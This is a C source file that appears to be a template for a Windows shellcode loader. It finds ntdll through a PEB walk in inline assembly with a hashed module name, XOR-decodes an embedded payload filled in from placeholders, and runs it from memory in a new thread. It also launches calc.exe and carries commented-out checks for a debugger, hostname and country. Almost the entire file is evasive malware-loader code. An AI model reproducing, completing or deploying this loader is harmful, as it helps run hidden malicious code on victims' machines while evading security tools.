#include <windows.h>
#include <stdio.h>


HMODULE CustomGetModuleHandle(unsigned int module_hash) {
    #ifdef _WIN64
        void* module_base = NULL;
        __asm__ __volatile__ (
            // Initialize r10d with hash and set up PEB access
            "movl %1, %%r10d\n\t"  
            "xor %%rdx, %%rdx\n\t"
            "mov %%gs:0x60, %%rdx\n\t"
            "mov 0x18(%%rdx), %%rdx\n\t"
            "mov 0x20(%%rdx), %%rdx\n\t"
        "load_module_name:\n\t"
            "mov 0x50(%%rdx), %%rsi\n\t"      // FullDllName.Buffer
            "movzwq 0x4A(%%rdx), %%rcx\n\t"   // Length (16-bit to 64-bit)
            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
        "module_hash_loop:\n\t"
            "xor %%rax, %%rax\n\t"
            "lodsb\n\t"                       // Load byte into AL
            "cmp $0x61, %%al\n\t"             // Compare with 'a'
            "jl skip_case_adjustment\n\t"
            "sub $0x20, %%al\n\t"             // Convert to uppercase
        "skip_case_adjustment:\n\t"
            "rol $13, %%r9d\n\t"              // Rotate left by 13 bits
            "add %%eax, %%r9d\n\t"            // Add AL to hash
            "loop module_hash_loop\n\t"
        "then:\n\t"
            "cmp %%r10d, %%r9d\n\t"           // Compare hash
            "je found\n\t"                     // If equal, jump to found
        "load_next_module:\n\t"
            "mov (%%rdx), %%rdx\n\t"          // Next module
            "jmp load_module_name\n\t"
        "found:\n\t"
            "mov %%rdx, %0\n\t"               // Store result
            : "=r" (module_base)              // Output
            : "r" (module_hash)                // Input
            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
        );
        return module_base;
    #else
        // 32-bit code TODO
        return NULL;
    #endif
}



void main() {



    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);

    // int is_debugged = d();
    // int size = z();
    // char *hostname = h();
    // char *country = c();
    // printf("is_debugged: %d\n", is_debugged);
    // printf("hostname: %s\n", hostname);
    // printf("size: %d\n", size);
    // printf("country: %s\n", country);
    
    unsigned char payload[] = "%SHELLCODE%";
    void* exec;
    BOOL rv;
    HANDLE th;
    DWORD old_protect;

    unsigned int ndtll_hash = 0xCCE6C0C4;
    HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);
    
    // Allocating executable memory
    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // XORing shellcode
    for (size_t i = 0; i < sizeof(payload); i++) {
        payload[i] ^= %XOR_KEY%;
    }
    
    // Copy shellcode into allocated memory
    memcpy(exec, payload, sizeof(payload));

    // Changing memory protection to PAGE_EXECUTE_READ
    rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);

    WaitForSingleObject(th, -1);
}

